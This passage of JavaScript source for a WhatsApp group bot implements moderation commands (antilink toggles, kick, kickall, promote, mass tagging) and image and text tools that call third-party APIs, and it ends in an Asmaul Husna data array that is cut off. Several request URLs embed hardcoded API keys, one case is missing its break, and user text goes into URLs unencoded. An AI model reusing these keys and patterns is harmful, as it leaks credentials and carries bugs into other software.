XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return replygcxeon('Already deactivated')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntilinkig))
replygcxeon('Success in turning off instagram antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkFacebook) return replygcxeon('Already activated')
ntilinkfb.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('Success in turning on facebook antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return replygcxeon('Already deactivated')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
replygcxeon('Success in turning off facebook antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkTelegram) return replygcxeon('Already activated')
ntilinktg.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('Success in turning on telegram antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return replygcxeon('Already deactivated')
let off = ntilinktg.indexOf(from)
ntilinktg.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntilinktg))
replygcxeon('Success in turning off telegram antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkTiktok) return replygcxeon('Already activated')
ntilinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('Success in turning on tiktok antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return replygcxeon('Already deactivated')
let off = ntilinktt.indexOf(from)
ntilinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntilinktt))
replygcxeon('Success in turning off tiktok antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
            case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('Already activated')
ntilinktwt.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('Success in turning on twitter antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return replygcxeon('Already deactivated')
let off = ntilinktwt.indexOf(from)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntilinktwt))
replygcxeon('Success in turning off twitter antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (AntiLinkTwitter) return replygcxeon('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('Success in turning on all antilink in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replygcxeon('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replygcxeon('Success in turning off all antilink in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (antiToxic) return replygcxeon('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('Success in turning on antitoxic in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replygcxeon('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replygcxeon('Success in turning off antitoxic in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (antiWame) return replygcxeon('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send wa.me in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiWame) return replygcxeon('Already deactivated')
let off = nttoxic.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replygcxeon('Success in turning off antiwame in this group')
} else {
  await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkgc': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (args[0] === "on") {
if (Antilinkgc) return replygcxeon('Already activated')
ntlinkgc.push(from)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('Success in turning on antiwame in this group')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkgc) return replygcxeon('Already deactivated')
let off = ntlinkgc.indexOf(from)
ntlinkgc.splice(off, 1)
fs.writeFileSync('./database/antilinkgc.json', JSON.stringify(ntlinkgc))
replygcxeon('Success in turning off antiwame in this group')
} else {
await replygcxeon(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
   case 'leavegc': {
if (!XeonTheCreator) return XeonStickOwner()
await XeonBotInc.groupLeave(m.chat)
await replygcxeon(`Done`)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!XeonTheCreator) return XeonStickOwner()
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add')
await replygcxeon(`Done`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcxeon(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
XeonBotInc.groupSettingUpdate(from, 'announcement')
replygcxeon(close)
}, timer)
}
break
           case 'ephemeral': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins) return XeonStickAdmin()
if (!text) return replygcxeon('Enter the value enable/disable')
if (args[0] === 'enable') {
await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replygcxeon(`Done`)
}
            }
            break
            case 'delete': case 'del': {
if (!XeonTheCreator) return XeonStickOwner()
if (!m.quoted) throw false
let { chat, id } = m.quoted
 XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
let response = await XeonBotInc.groupInviteCode(m.chat)
XeonBotInc.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replygcxeon('The message was not sent by a bot!')
                 XeonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replygcxeon('*Choose:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
}
replygcxeon(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
XeonBotInc.groupSettingUpdate(from, 'not_announcement')
replygcxeon(open)
}, timer)
}
break
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcxeon(`Done`)
}
break
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
let users = participants.map(u => u.id)
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove')
await replygcxeon(`Done`)
}
break
case 'setbotname':{
if (!XeonTheCreator) return XeonStickOwner()
if (!text) return replygcxeon(`Where is the name?\nExample: ${prefix + command} Cheems Bot`)
    await XeonBotInc.updateProfileName(text)
    replygcxeon(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!XeonTheCreator) return XeonStickOwner()
if (!text) return replygcxeon(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await XeonBotInc.updateProfileStatus(text)
    replygcxeon(`Success in changing the bio of bot's number`)
    }
    break
    case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins) return XeonStickAdmin()
if (!text) return replygcxeon('Text ?')
await XeonBotInc.groupUpdateSubject(m.chat, text)
await replygcxeon(`Done`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return XeonStickBotAdmin()
if (!isAdmins) return XeonStickAdmin()
if (!text) return replygcxeon('Text ?')
await XeonBotInc.groupUpdateDescription(m.chat, text)
await replygcxeon(`Done`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await XeonBotInc.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
XeonBotInc.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
if (!quoted) return replygcxeon(`Where is the picture?`)
if (!/image/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcxeon(`Send/Reply Image With Caption ${prefix + command}`)
var mediz = await XeonBotInc.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await XeonBotInc.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replygcxeon(`Success`)
} else {
var memeg = await XeonBotInc.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replygcxeon(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
    await XeonBotInc.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!XeonTheCreator) return XeonStickOwner()
    await XeonBotInc.removeProfilePicture(XeonBotInc.user.id)
    replygcxeon(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote')
await replygcxeon(`Done`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote')
await replygcxeon(`Done`)
}
break
case 'hidetag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'ht': {
if (!m.isGroup) return reply(mess.only.group)
if (!XeonTheCreator) return XeonStickOwner()
XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break

case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
               if (!m.quoted) return replygcxeon(`Reply message with caption ${prefix + command}`)
               XeonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
if (!isBotAdmins) return XeonStickBotAdmin()
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *Tagger :*  @${me.split('@')[0]}
 🌿 *Message : ${q ? q : 'no message'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { eBinary } = require('./scrape/binary')
let eb = await eBinary(`${q}`)
replygcxeon(eb)
}
break
case 'dbinary': {
if (!q) return replygcxeon(`Send/reply text with captions ${prefix + command}`)
reply(mess.wait)
let { dBinary } = require('./scrape/binary')
let db = await dBinary(`${q}`)
replygcxeon(db)
}
break

case 'toanime':
case  'jadianime':{
if (!quoted) return replygcxeon(`mana Fotonya kak?`)
reply(mess.wait)
const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh (media)
XeonBotInc 
XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.akuari.my.id/ai/toanime?urlimg=${anu}` }, caption: `*Sukses membuat Anime*` }, { quoted: m})
}
break
//=========================================\\
case 'removebg':
case 'nobg':
case 'hapusbackground':{
if (!quoted) return replygcxeon(`mana Fotonya kak?`)
reply(mess.wait)
const media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh (media)
var tluy = await fetchJson(`https://myfirstexpress-1.xvdxsix.repl.co/api/tools/removebg?url=${anu}`)
XeonBotInc.sendMessage(m.chat, { image: { url: tluy.result.image_data }, caption: `*Sukses menghapus background*` }, { quoted: m})
}
//=========================================\\
case 'hd':
  case 'remini':{
if (!quoted) return replygcxeon(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcxeon(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			reply(mess.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			XeonBotInc.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
			}
			break
//=========================================\\
case 'ss':
case 'ssweb':{
if (!text) return replygcxeon(`mana linknya kak?`)
XeonBotInc.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=dzsyabotz` }}, { quoted: m})
}
break
//=========================================\\

case 'sertifikattolol':
case 'sertiflol': {
  if (!q) return replygcxeon(`Mana Nama Orangnya Kak`)
  reply(mess.wait)
  XeonBotInc.sendMessage(m.chat, { image: { url: `https://kiicodeofficial.my.id/api/maker/tolol?text=${q}&apikey=Dzsyacans`
 }, caption: `_Ini Dia Sertifikat Nya Kak_` }, { quoted: m})
}
break
//=========================================\\
case 'logoneko':
case 'nekologo': {
  if (!q) return replygcxeon(`Mana Nama Orangnya Kak`)
  reply(mess.wait)
  XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.caliph.biz.id/api/girlneko?nama=${q}&nama2=dev&apikey=CcVXxbMw`
 }, caption: `_Ini Dia Logo Nya Kak_` }, { quoted: m})
}
break
//======================================================================
case 'nulis':
case 'nulisbuku': {
  if (!q) return replygcxeon(`Mana text nya`)
  reply(mess.wait)
  XeonBotInc.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/nulis?apikey=Akiraa&text=${q}`
 }, caption: `_Ini Dia Hasilnya kak🐦_` }, { quoted: m})
}
break
//=========================================\\
case 'kisahnabi': {
     if (!text) return replygcxeon(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replygcxeon("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     replygcxeon(`${hasil}`)

}
break
//=========================================\\
const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
